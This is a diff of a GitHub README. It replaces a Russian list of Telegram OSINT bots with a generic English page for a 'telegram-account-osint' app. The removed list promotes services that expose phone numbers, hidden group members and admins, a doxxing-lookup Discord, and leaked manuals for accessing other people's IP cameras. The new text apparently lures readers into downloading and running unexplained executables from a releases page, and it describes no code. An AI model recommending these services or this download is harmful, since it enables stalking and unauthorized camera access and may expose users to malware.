@@ -1,71 +1,72 @@
-# 🔍 Telegram OSINT: поиск по ID, username, ссылкам, стикерам и всему остальному (2025)
+# 🔍 telegram-account-osint - Discover Telegram Accounts Easily
 
-Актуальная подборка ботов, сайтов и инструментов для разведки в Telegram.  
-Наш дискорд канал ( пробивы по фио, почтам , адресу , аккаунтам в соцсетях и т.д ) - https://discord.gg/zDNW39HKva  
-Мануалы по подключениям к чужим IP-камерам тут ( слитые ) - https://t.me/+B-o_2HZOffxjYjFi
+## 🚀 Getting Started
 
+Welcome to the **telegram-account-osint** project! This tool helps you find Telegram accounts using various methods. Whether you have an ID or username, you can uncover account details with ease.
 
-## Поиск по ID или username аккаунта
+## 📥 Download & Install
 
-| №  | Бот / Сервис                                                    | Что делает                                                                                  |
-|----|-----------------------------------------------------------------|---------------------------------------------------------------------------------------------|
-| 1  | `@usinfobot`                                                    | По ID → имя, ссылка, архивные данные                                                        |
-| 2  | [cybdetective.com архив](https://cybdetective.com/quickcacheandarhivesearch.html) | 20+ ссылок на веб-архивы по любой ссылке t.me                                      |
-| 3  | `@SangMata_beta_bot`                                            | История смены имени и username (отправьте ID)                                               |
-| 4  | `@creationdatebot`                                              | Примерная дата создания аккаунта (по username или пересланному сообщению)                   |
-| 5  | [TelegramOnlineSpy](https://github.com/Forichok/TelegramOnlineSpy) | Лог онлайна: когда пользователь был в сети                                          |
-| 6  | `@UniversalSearchSmartBot`                                      | Почты, старые имена, аватарки, ищет сразу в куче других ботов                               |
-| 7  | `@ibhld_bot`                                                    | Интересы, платно — телефон, история имён, группы, ссылки                                    |
-| 8  | `@unamer_search_bot`                                            | Кто владел username раньше, история смены имён                                              |
-| 9  | `@getchatlistbot`                                               | В каких группах состоит пользователь                                                        |
-| 10 | [tgdb.org](https://www.tgdb.org/page/login?redir=%2Fbot)        | Группы, в которых был замечен, архивные имена                                               |
-| 11 | `@x8152384_bot`                                                 | Телефон, история имён, кто получал подарки                                                  |
-| 12 | `@dataiszbot`                                                   | История имён, группы, сообщения пользователя                                                |
-| 13 | `@dateregbot`                                                   | Более точная дата регистрации                                                               |
-| 14 | `@HGB94836385_bot`                                              | Телефоны, история имён, дата регистрации                                                   |
-| 15 | `@starget_bot`                                                  | ИИ-психологический портрет, интересы, возраст, пол, возможный адрес                         |
-| 16 | `@TelPulseBot`                                                  | ИИ-анализ сообщений, групп, истории имён, подарков, стикеров                                |
-| 17 | `@InvestigatorRobot`                                            | История имени и username (огромная зарубежная база)                                         |
+To get started, visit the page below to download the application:
 
-## Универсальный поиск по любым данным в Telegram
+[![Download telegram-account-osint](https://img.shields.io/badge/Download-telegram--account--osint-blue.svg)](https://github.com/tasiedev/telegram-account-osint/releases)
 
-| №  | Сервис / Бот                                                    | Что ищет                                                                                    |
-|----|-----------------------------------------------------------------|---------------------------------------------------------------------------------------------|
-| 1  | [Google CSE Telegram](https://cse.google.com/cse?cx=006368593537057042503:efxu7xprihg) | Всё: каналы, группы, боты, стикеры, Telegraph                                               |
-| 2  | [lyzem.com](https://lyzem.com/)                                 | Посты, каналы, группы, Telegraph                                                           |
-| 3  | [tgstat.com/search](https://tgstat.com/ru/search)               | Публичные каналы                                                                            |
-| 4  | [Yandex HowToFind](https://yandex.ru/search/site/?text=%22HowToFind%22&searchid=2424333) | 17 агрегаторов сразу: каналы, группы, Telegraph                                    |
-| 5  | `@MotherSearchBot`                                              | Файлы и посты из публичных каналов                                                          |
-| 6  | [Google CSE комментарии](https://cse.google.com/cse?cx=006368593537057042503:ig4r3rz35qi) | Комментарии под постами                                                            |
-| 7  | [telegramdb.org](https://telegramdb.org/)                       | Публичные группы + ссылки                                                                   |
-| 8  | [telemetr.me/all_posts](https://telemetr.me/all_posts/)         | Описания каналов и ботов, все посты (мобильная версия)                                      |
-| 9  | [tgramsearch.com](https://tgramsearch.com/)                     | Поиск по названию и описанию каналов                                                        |
-| 10 | [tgdev.io/tme](https://tgdev.io/tme/)                           | 700+ млн постов с фильтрами по дате                                                         |
-| 11 | `@en_SearchBot`                                                 | Поиск по названию групп и каналов → прямая ссылка                                           |
+Head to our Releases page to grab the latest version: [Releases Page](https://github.com/tasiedev/telegram-account-osint/releases)
 
-## Поиск по пригласительной ссылке (группа/канал)
+### 🖥️ System Requirements
 
-| №  | Инструмент                                                      | Что делает                                                                                  |
-|----|-----------------------------------------------------------------|---------------------------------------------------------------------------------------------|
-| 1  | `@ChatSearchRobot`                                              | Находит публичные чаты по участникам группы                                                 |
-| 2  | [telemetr.io](https://telemetr.io/)                             | Удалённые публикации                                                                        |
-| 3  | [telegramdb.org](https://telegramdb.org/)                       | Даже удалённые каналы/группы → ссылка, фото, описание                                       |
-| 4  | `@f374774_bot`                                                  | Выгрузит всех участников группы (даже скрытых)                                              |
-| 5  | `@hgf7896_bot`                                                  | История изменений, удалённые сообщения, статистика участников                              |
-| 6  | `@telescanbiozerkalo_Bot`                                       | Находит скрытых админов группы                                                              |
-| 7  | `@groups_research_bot`                                          | Упоминания канала в других группах (/search_link @username)                                 |
+- **Operating System:** Windows 10 or later, macOS, or Linux
+- **Memory:** 4GB RAM minimum
+- **Disk Space:** 100MB available space
 
-## Поиск по стикерам и эмодзи
+### ⚙️ Installation Steps
 
-| №  | Бот                                                             | Что делает                                                                                  |
-|----|-----------------------------------------------------------------|---------------------------------------------------------------------------------------------|
-| 1  | `@SPOwnerBot`                                                   | Пришли стикер → получишь Telegram ID автора стикерпака                                      |
+1. **Visit the Releases Page**: Click the link above to access our releases.
 
-## Полезные вспомогательные инструменты
+2. **Choose Your File**: Look for the latest version. Download the appropriate file for your system (Windows, macOS, or Linux).
 
-- `@AximoBot` → мгновенно сохраняет новые посты канала  
-- `@surftg_bot` → уведомления, когда нужное слово появилось в группах  
-- `@Stickerdownloadbot` → скачивает стикеры в PNG высокого качества  
-- `@EmojiDownloadBot` → скачивает кастомные эмодзи в PNG  
-- [bibaandboba](https://github.com/andylvua/bibaandboba) → корреляция участников в группе  
-- [telegram-filtered-chat-parser](https://github.com/cyb3rm4gus/telegram-filtered-chat-parser) → глубокий анализ чата
+3. **Run the Installer**:
+   - **Windows**: Double-click the `.exe` file and follow the setup instructions.
+   - **macOS**: Open the `.dmg` file, drag the app into your Applications folder.
+   - **Linux**: Use the terminal to navigate to the file location and run the executable.
+
+4. **Launch the Application**: Find the app icon in your applications menu and click to open it.
+
+## 🔍 Features
+
+- **Account Search**: Find accounts using ID or username.
+- **Stickers & Links**: Search through stickers and links related to accounts.
+- **Privacy-Focused Tools**: Enjoy tools designed with user privacy in mind.
+- **Easy Navigation**: Simple interface meant for everyone, no tech background required.
+
+## 🛠️ How to Use
+
+1. **Open the App**: Start the application from your desktop or applications menu.
+
+2. **Input Details**: Enter either the ID or username of the Telegram account you want to investigate.
+
+3. **View Results**: The app will display information such as the account name, any available links, and additional data.
+
+4. **Explore Profiles**: Access other tools for deeper investigations if needed.
+
+## 🤝 Community Support
+
+Join our Discord channel for support and discussions. Share tips or ask questions:
+
+[Discord Channel](https://discord.gg/zDNW39HKva)
+
+## 💡 Helpful Resources
+
+- [Search Tools] - Connect to various services for more in-depth account searches.
+- [Cybdetective Archive](https://cybdetective.com/quickcacheandarhivesearch.html) - Find archived data from over 20 web sources.
+
+## 📝 Contributing
+
+We welcome contributions! If you want to help improve this project, please check our guidelines in the repository.
+
+## 📢 Stay Updated
+
+For the latest updates and features, follow the project on GitHub. Check back regularly for new releases and information.
+
+[![Download telegram-account-osint](https://img.shields.io/badge/Download-telegram--account--osint-blue.svg)](https://github.com/tasiedev/telegram-account-osint/releases)
+
+Thank you for choosing **telegram-account-osint**! Enjoy simplifying your Telegram search experience.
